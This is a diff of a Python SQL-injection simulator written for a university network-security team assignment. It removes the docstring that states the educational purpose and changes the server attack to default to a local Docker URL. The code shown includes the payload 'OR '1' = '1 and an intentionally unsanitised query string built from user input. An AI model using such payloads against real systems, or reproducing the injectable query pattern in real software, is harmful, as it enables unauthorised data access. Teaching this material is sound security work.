@@ -1,54 +1,5 @@
 import sqlite3
 import os
-
-"""
-Python 3.9.7
-Date: 2023-10-15 14:30:45
-Author: Clint and Constantine
-CSCEA465 Network Security
-Peer Learning Assignment: Team: Database B
-  - Team Lead: Constantine
-  - Offense Team: Constantine, Clint
-  - Defense Team: Gwen, Nicasio
-
-Offense Method: SQL Injection
-This program simulates SQL injection attacks against a centralized database in a standalone, controlled environment.
-It is designed for educational purposes to demonstrate how SQL injection works and how to prevent it.
-
-Key Features:
-  - SQL Injection Simulation: Allows users to simulate SQL injection attacks in a controlled environment.
-  - Dynamic Query Input: Users can choose from default queries, manually input queries, or select from predefined queries.
-  - User-Friendly Menu: Provides a clear and interactive menu for selecting attacks and viewing results.
-  - Debugging Information: Displays detailed debug information for database connections and query execution.
-  - Dynamic Programming: Precomputes and stores reusable data structures to optimize performance.
-  - Centralized String Management: All prompts and messages are stored in the class body for easy modification and localization.
-  - Enhanced User Interaction: 
-    - Press {input_return} to return to the main menu at any time.
-    - Press {input_quit} to quit the program entirely.
-  - Database Flexibility: Supports multiple database types (e.g., SQLite3) via a dispatch dictionary.
-
-Key Classes and Functions:
-  - SQLInjectionAttacks: Main class for managing SQL injection attacks.
-    - get_user_credentials: Simulates an SQL injection attack to extract user credentials.
-    - display_menu: Displays a formatted menu of available attacks and statistics.
-    - get_user_choice: Prompts the user to select an attack by number or name.
-    - get_query_input: Prompts the user to input a query or select from predefined options.
-    - main_menu: Main loop for interacting with the user.
-    - get_handle_query: Generalized handler for query input options (default, manual, predefined).
-  - manage_db_connection: Manages database connections and executes attacks.
-  - execute_attack: Executes the selected attack based on the attack ID and query.
-
-Usage:
-  - Run the script and follow the on-screen instructions to simulate SQL injection attacks.
-  - Use the menu to select attacks, input queries, and view results.
-  - Press {input_return} to return to the main menu or {input_quit} to quit the program at any time.
-
-Notes:
-  - This program is for educational purposes only and should not be used for malicious purposes.
-  - Ensure the database file exists and is accessible before running attacks.
-"""
-import sqlite3
-import os
 import platform
 import requests  # For making HTTP requests to target servers
 
@@ -65,7 +16,7 @@ class SQLInjectionAttacks:
             },
             2: {
                 "function": self.target_server,
-                "sqli_name": "Target Server (e.g., Docker)",
+                "sqli_name": "Target Docker-Hosted SQLite3",
                 "default_query": "'OR '1' = '1"  # Default query for this attack
             }
             # Add more attacks here as needed
@@ -243,18 +194,16 @@ class SQLInjectionAttacks:
 
     def target_server(self, query, db_connection, db_cursor):
         """
-        Simulates an SQL injection attack against a server (e.g., Docker container).
-        This method sends a malicious query to a server running a database service.
+        Simulates an SQL injection attack against a Docker-hosted SQLite3 database.
+        This method assumes the server is running a SQLite3 database in a Docker container.
         """
-        # Prompt the user for the server URL (e.g., http://localhost:8080)
-        server_url = input("Enter the server URL (e.g., http://localhost:8080): ").strip()
-        if not server_url:
-            print("No server URL provided. Returning to main menu.")
-            return None
+        # Default Docker server URL (can be overridden by user input)
+        default_server_url = "http://localhost:8080"
+        server_url = input(f"Enter the server URL (default: {default_server_url}): ").strip() or default_server_url
 
         # Construct the malicious query
         malicious_query = f"SELECT * FROM users WHERE username = '{query}'"
-        print(f"Sending malicious query to server: {malicious_query}")
+        print(f"Sending malicious query to Docker-hosted SQLite3 server: {malicious_query}")
 
         try:
             # Simulate sending the query to the server (e.g., via HTTP POST)
